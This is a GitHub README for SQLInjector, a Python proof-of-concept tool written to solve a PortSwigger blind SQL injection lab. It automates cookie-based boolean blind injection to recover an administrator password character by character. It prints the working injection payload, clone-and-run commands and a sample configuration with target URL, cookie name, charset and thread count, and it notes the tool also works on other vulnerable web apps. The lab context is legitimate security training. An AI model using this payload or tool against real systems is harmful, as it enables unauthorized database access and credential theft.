# SQLInjector

At the moment the app is able to test for cookie injection vulnerabilities. It can be passed the url to test, the code
to inject, the name of the cookie to inject, a confirmation string to be matched on the response content, chars-set to
use for brute forcing, password length, and max number of concurrent thread to run.

##### Testing
This code is a POC, and has been written to solve PortSwigger's lab: [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses).
This lab can be used to test the code, or any other web app, where a cookie injection vulnerability exists. The app 
will inject the specified code in the cookie we specify by name, and submit the conditional statements to the web app,
checking if our chosen string can be matched on the response content.

##### The injection code
The code that can be injected by default is:
   ```sql
   ' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--`
   ```
The `{char_numb}` and the `{character}` tags are just placeholder. The Brute Forcer will replace the `{char_numb}`
with the character position (index) of the password string. The `{character}` tag will be replaced with a character
taken from the specified char-set.  
  
By changing these two values in the injected code, the Cookie Injector app will try to recover the administrator's
password.

### Usage:
1. Clone the repository

   ```zsh
    git clone https://github.com/hogchild/SQLInjector.git
   ```
2. cd into the SQLInjector directory
   ```zsh
   cd SQLInjector
   ```
3. Run Cookie Injector
   ```zsh
   python3.12 -m SQLInjector.cookie_injector --help
   ```
   ```zsh
   Usage: python -m SQLInjector.cookie_injector [OPTIONS]
   
     This app injects a cookie, sends the crafted request, and checks the
     response from the page content. It needs a JSON configuration file. You can
     edit this manually, at the path: 'config/cookie_injector.json'. The setup
     utility will run automatically, to create one, when launching
     cookie_injector.py without a configuration file in the config folder.
     Alternatively you can run it with the '-s' option.
   
   Options:
     -u, --set-url TEXT      Specify target URL instead of the one in config
                             file.
     -s, --setup-utility     Interactively edit the config file.
     -f, --config-file PATH  Path to config file.  [default:
                             config/cookie_injector.json; required]
     -o, --out-file PATH     Path to output file with the recovered password.
     --help                  Show this message and exit.
   ```
### Example Configuration File
**File path:** config/cookie_injector.json
```json
{
   "target_url": "https://0a76003c03fc905d81c6c029009800fa.web-security-academy.net/product?productId=2",
   "inject_code": "' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--",
   "passwd_length": 20,
   "char_set": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
   "confirm_string": "Welcome",
   "cookie_name": "TrackingId",
   "max_threads": 20
}
```

### Demo
![Demo gif](data/demo.gif)

---

### Directory Structure

- SQLInjector
  - Config
    - cookie_ingector.json
  - Data
    - input
    - output
    - demo.gif
  - docs
  - SQLInjector
    - \_\_init__.py
    - brute_forcer.py
    - cookie_injector.py
    - cookie_injector_core.py
    - cookie_injector_setup.py
    - custom_errors.py
  - tests
    - \_\_init__.py
    - test_cookie_injector_core.py
    - test_cookie_injector_setup.py
  - \_\_init__.py
  - README.md
  - requirements.txt
